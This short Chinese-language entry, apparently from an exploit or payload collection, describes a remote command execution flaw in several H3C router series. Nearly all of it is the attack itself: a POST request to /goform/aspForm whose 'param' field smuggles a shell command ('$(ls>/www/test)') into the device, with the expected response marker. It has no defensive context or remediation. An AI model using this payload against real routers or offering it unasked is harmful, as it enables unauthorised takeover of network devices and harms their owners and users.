# H3C多系列路由器存在前台RCE漏洞

H3C ｜ 命令执行 ｜ —
- **请求**：`POST /goform/aspForm HTTP/1.1`

**Payload**
```
CMD=DelL2tpLNSList&GO=vpn_l2tp_session.asp&param=1; $(ls>/www/test);
```
- **响应特征**：-1